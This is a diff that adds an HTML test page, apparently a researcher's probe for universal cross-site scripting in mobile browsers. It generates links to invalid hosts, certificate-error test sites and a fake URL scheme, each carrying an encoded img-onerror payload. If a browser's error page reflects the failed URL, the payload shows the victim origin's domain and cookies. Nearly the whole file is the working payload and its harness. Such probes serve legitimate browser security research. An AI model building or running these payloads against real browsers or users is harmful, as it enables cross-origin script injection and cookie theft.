@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Error-page reflection UXSS probe</title>
+<style>body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:18px;line-height:1.5}
+a{display:block;color:#0b62d6;word-break:break-all;margin:8px 0;font-size:12.5px} small{color:#666}</style>
+</head>
+<body>
+<h1>Error / interstitial reflection UXSS</h1>
+<p>Browsers render their own error pages echoing the failed URL. On iOS this often renders IN the failing origin → reflected markup = UXSS. Tap each link; watch for <b>pwned by 33x</b>.</p>
+<div id="links"></div>
+<small>Success = the &lt;img onerror&gt; fires and document.domain = the failing/victim origin (or chrome-error/about:neterror), not this page.</small>
+<script>
+var Q = '"><img src=x onerror="alert(\'pwned by 33x | \'+document.domain+\' | \'+document.cookie)">';
+var urls = [
+  'http://' + encodeURIComponent(Q) + '.invalid/',
+  'http://x' + encodeURIComponent(Q) + '.example:99999/',
+  'https://expired.badssl.com/?x=' + encodeURIComponent(Q),
+  'https://wrong.host.badssl.com/?x=' + encodeURIComponent(Q),
+  'https://self-signed.badssl.com/?x=' + encodeURIComponent(Q),
+  'foo:' + encodeURIComponent(Q),
+  'https://' + encodeURIComponent(Q) + '.nonexistent-tld-zzz/'
+];
+var out=document.getElementById('links');
+urls.forEach(function(u){ var a=document.createElement('a'); a.href=u; a.textContent=u.slice(0,90); out.appendChild(a); });
+</script>
+</body>
+</html>
